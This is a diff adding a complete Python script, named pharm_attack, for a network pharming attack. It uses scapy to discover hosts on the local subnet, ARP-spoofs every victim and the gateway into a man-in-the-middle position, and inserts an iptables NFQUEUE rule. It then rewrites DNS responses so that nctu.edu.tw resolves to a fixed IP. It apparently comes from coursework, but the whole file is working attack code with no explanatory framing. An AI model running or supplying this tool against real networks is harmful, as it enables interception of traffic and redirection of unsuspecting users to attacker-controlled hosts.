@@ -1,0 +1,140 @@
+#!/usr/bin/env python3
+
+# sudo chmod +x pharm_attack
+
+import scapy.all as scapy
+from netfilterqueue import NetfilterQueue
+import os
+import socket
+import struct
+import uuid
+import sys
+import time
+
+
+dns_hosts = {
+    b"www.nctu.edu.tw.": "140.113.207.246",
+    b"nctu.edu.tw.": "140.113.207.246"
+}
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.DNSRR):
+        print("[IN ]:", scapy_packet.summary())
+        try:
+            scapy_packet = modify_packet(scapy_packet)
+        except IndexError:
+            pass
+        print("[OUT]:", scapy_packet.summary(),"\n")
+        packet.set_payload(bytes(scapy_packet))
+    packet.accept()
+
+
+def modify_packet(packet):
+    qname = packet[scapy.DNSQR].qname
+    if qname not in dns_hosts:
+        #print("[No Modify  ]:", qname)
+        return packet
+    packet[scapy.DNS].an = scapy.DNSRR(rrname=qname, rdata=dns_hosts[qname])
+    packet[scapy.DNS].ancount = 1
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.UDP].len
+    del packet[scapy.UDP].chksum
+    return packet
+
+def get_gateway_linux():
+    with open("/proc/net/route") as fh:
+        for line in fh:
+            fields = line.strip().split()
+            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
+                continue
+            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
+
+def getmyip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(('8.8.8.8', 1))
+    return s.getsockname()[0]
+
+def getmysubnet(myip):
+    return myip.rsplit('.',1)[0]+'.1/24'
+
+def getlist(ip):
+    arp = scapy.ARP(pdst=ip)
+    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    packet = ether/arp
+    result = scapy.srp(packet, timeout=3, verbose=0)[0]
+    list = []
+    for sent, received in result:
+        list.append({'ip': received.psrc, 'mac': received.hwsrc})
+    return list
+
+def restore(destination_ip,destination_mac, source_ip, source_mac):
+    packet = scapy.ARP(op=2, pdst=destination_ip,
+                       hwdst=destination_mac,
+                       psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+def spoof(target_ip, target_mac, spoof_ip):
+    packet = scapy.ARP(op=2, pdst=target_ip,
+                             hwdst=target_mac,
+                             psrc=spoof_ip)
+    scapy.send(packet, verbose=0)
+    
+if __name__ == "__main__":
+    attackerIP=getmyip()
+    attackerMAC=':'.join('{:02x}'.format((uuid.getnode() >> ele ) & 0xff) for ele in range(0,8*6,8)[::-1])
+    gatewayIP=get_gateway_linux()
+    target_net=getmysubnet(attackerIP)
+    clients=getlist(target_net)
+    victimlist=[]
+    #print("Available devices in the network:")
+    #print("IP" + " "*18+"MAC")
+    for client in clients:
+        if client['ip']==gatewayIP:
+            gatewayMAC=client['mac']
+        else:
+            victimlist.append({'ip': client['ip'], 'mac': client['mac']})
+        #print(" {:16}    {}".format(client['ip'], client['mac']))
+    #print("\nAttacker IP"+ " "*9 + "MAC")
+    #print(" {:16}    {}".format(attackerIP,attackerMAC))
+    #print("Gateway  IP"+ " "*9 + "MAC")
+    #print(" {:16}    {}".format(gatewayIP,gatewayMAC))
+    print("Victim   IP"+ " "*9+"MAC")
+    for victim in victimlist:
+            print(" {:16}    {}".format(victim['ip'], victim['mac']))
+    print('\n[+] Arp Spoofing')
+    send_packets_count = 0
+    for victim in victimlist:
+        spoof(victim['ip'], attackerIP, gatewayIP)
+        spoof(gatewayIP, gatewayMAC, victim['ip'])
+        send_packets_count += 2
+        print("[+] Packets sent: "+str(send_packets_count)+" Victim : " + victim['ip'])
+        time.sleep(2)
+    print("[+] Spoofing Complete.")
+
+    print("\n[+] Start DNS modification.")
+    print("[+] Load DNS Redirect List.")
+    print(" ",dns_hosts)
+    print("[+] Searching DNSRR Packets.")
+    print("[+] Ctrl-C to stop receiving packets.")
+    QUEUE_NUM = 0
+    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
+    queue = NetfilterQueue()
+    try:
+        queue.bind(QUEUE_NUM, process_packet)
+        queue.run()
+    except KeyboardInterrupt:
+        os.system("iptables --flush")
+
+    print("\nRecover to the Origin MAC? "),
+    ans = input('(Y/N) << ').lower()
+    if ans in ['yes', 'y']:
+        for victim in victimlist:
+            restore(victim['ip'], victim['mac'], gatewayIP, gatewayMAC)
+            restore(gatewayIP, gatewayMAC, victim['ip'], victim['mac'])
+        print("Origin Setting have been recovered.")
+    else:
+        print("Exit with Spoofing state.")
+
+
